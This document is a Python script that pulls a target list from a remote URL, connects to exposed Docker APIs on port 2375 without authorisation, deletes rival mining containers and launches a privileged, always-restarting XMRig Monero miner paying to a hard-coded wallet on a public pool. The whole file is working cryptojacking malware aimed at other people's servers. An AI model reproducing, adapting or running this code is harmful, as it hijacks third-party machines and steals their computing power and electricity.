import docker
import time
from datetime import datetime
from docker.errors import DockerException
from colorama import Fore, init
import requests
from concurrent.futures import ThreadPoolExecutor
import platform
import os

# --- Configuration ---
DOCKER_PORT = '2375'
DOCKER_KEYWORDS_DELETE = ["xmrig", "miner", "xmr", "unmineable"]
EXCLUDED_STRINGS = [
    "45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s"
]
IPS_URL = 'https://thev1gilante.github.io/ips.json'

MINING_IMAGE = "ghcr.io/murf2/xmrig.docker:latest"
POOL_URL = "gulf.moneroocean.stream:10128"
POOL_USER = "45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s"
POOL_PASS = "x"
COIN = "xmr"

CHECK_INTERVAL = 10  # seconds

init(autoreset=True)

def fetch_docker_ips():
    try:
        response = requests.get(IPS_URL)
        if response.status_code == 200:
            data = response.json()
            return data.get("ips", [])
        print(f"{Fore.RED}[Error] Could not fetch IPs. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to fetch IP list: {e}")
    return []

def list_docker_images(client):
    print(f"{Fore.LIGHTBLUE_EX}# Listing Docker Images:")
    for image in client.images.list():
        tags = ', '.join(image.tags) if image.tags else 'None'
        print(f"# Image ID: {image.id}\n# Tags: {tags}")
        print("-" * 40)

def list_and_clean_containers(client, ip):
    containers = client.containers.list(all=True)
    suspicious_found = False
    print(f"{Fore.LIGHTBLUE_EX}# Checking containers on {ip}:{DOCKER_PORT}")

    for container in containers:
        image_tag = container.image.tags[0] if container.image.tags else ""
        cmd = container.attrs.get('Config', {}).get('Cmd', [])
        print(f"# ID: {container.id}, Name: {container.name}, Status: {container.status}")
        print(f"# Image: {image_tag}")

        all_exclusions = EXCLUDED_STRINGS + [ip]

        if any(excluded in str(arg) for excluded in all_exclusions for arg in cmd):
            print(f"{Fore.GREEN}[Safe] Excluded string or IP found in command. Skipping.")
            continue

        container_labels = container.attrs['Config'].get('Labels', {})
        if container.name.startswith("miner_") or container_labels.get('protected') == 'true':
            print(f"{Fore.GREEN}[OK] Skipping manually created container: {container.name}")
            continue

        if any(keyword in image_tag.lower() for keyword in DOCKER_KEYWORDS_DELETE):
            suspicious_found = True
            try:
                if container.status == "running":
                    container.stop()
                container.remove()
                print(f"{Fore.GREEN}[Removed] Container: {container.name}")
            except DockerException as e:
                print(f"{Fore.YELLOW}[Error] Could not remove container: {e}")
        else:
            print(f"{Fore.GREEN}[OK] Not a mining container.")
        print("-" * 40)

    return suspicious_found

def pull_miner_image(client):
    try:
        existing = [tag for img in client.images.list() for tag in img.tags]
        if MINING_IMAGE not in existing:
            print(f"{Fore.BLUE}[Pulling] Miner image...")
            client.images.pull(MINING_IMAGE)
            print(f"{Fore.GREEN}[Pulled] Miner image.")
        else:
            print(f"{Fore.GREEN}[OK] Miner image already exists.")
    except DockerException as e:
        print(f"{Fore.RED}[Error] Could not pull image: {e}")

def list_running_miner_containers(client, ip):
    running_containers = []
    containers = client.containers.list(filters={"status": "running"})
    for container in containers:
        image_tag = container.image.tags[0] if container.image.tags else ""
        if MINING_IMAGE in image_tag and ip in container.name:
            running_containers.append(container)
    return running_containers

def is_windows_docker(client):
    try:
        info = client.info()
        return "windows" in info.get("OperatingSystem", "").lower()
    except Exception:
        return False

def create_miner_container(client, ip):
    name = f"miner_{ip}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
    pool_user_with_worker = f"{POOL_USER}.{name}"
    windows_host = is_windows_docker(client)

    try:
        print(f"{Fore.BLUE}[Create] Launching new miner container...")
        container = client.containers.run(
            MINING_IMAGE,
            detach=True,
            name=name,
            environment={
                "POOL_URL": POOL_URL,
                "POOL_USER": pool_user_with_worker,
                "POOL_PASS": POOL_PASS,
                "COIN": COIN,
                "WORKERNAME": name
            },
            auto_remove=False,
            restart_policy={"Name": "always"},
            privileged=not windows_host,
            labels={"safe": "true"}
        )
        print(f"{Fore.GREEN}[Created] Miner container: {name}")
    except DockerException as e:
        print(f"{Fore.RED}[Error] Failed to create container: {e}")

def process_docker_host(ip):
    print(f"\n{Fore.CYAN}=== [Processing Docker Host: {ip}] ===")
    try:
        client = docker.DockerClient(base_url=f'tcp://{ip}:{DOCKER_PORT}')
        list_docker_images(client)
        pull_miner_image(client)
        suspicious = list_and_clean_containers(client, ip)

        if suspicious:
            print(f"{Fore.RED}[Alert] Suspicious containers removed.")
        else:
            print(f"{Fore.GREEN}[Info] No suspicious containers found.")

        existing_miner_containers = list_running_miner_containers(client, ip)
        if existing_miner_containers:
            print(f"{Fore.YELLOW}[Info] Miner container already running: {existing_miner_containers[0].name}. Skipping creation.")
        else:
            create_miner_container(client, ip)

    except DockerException as e:
        print(f"{Fore.RED}[Error] Cannot connect to Docker at {ip}:{DOCKER_PORT} - {e}")

def main():
    while True:
        cycle_start = datetime.now()
        print(f"\n{Fore.MAGENTA}=== [Cycle Start: {cycle_start.strftime('%Y-%m-%d %H:%M:%S')}] ===")

        docker_ips = fetch_docker_ips()
        if not docker_ips:
            print(f"{Fore.RED}[Error] No Docker IPs found. Retrying in 60 seconds...")
            time.sleep(60)
            continue

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(process_docker_host, docker_ips)

        cycle_end = datetime.now()
        print(f"\n{Fore.MAGENTA}=== [Cycle Complete: {cycle_end.strftime('%Y-%m-%d %H:%M:%S')}] ===")
        print(f"{Fore.YELLOW}Cycle Duration: {cycle_end - cycle_start}")
        print(f"{Fore.CYAN}Sleeping for {CHECK_INTERVAL} seconds...\n")

        # Clear terminal before next cycle
        os.system('cls' if platform.system() == 'Windows' else 'clear')

        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
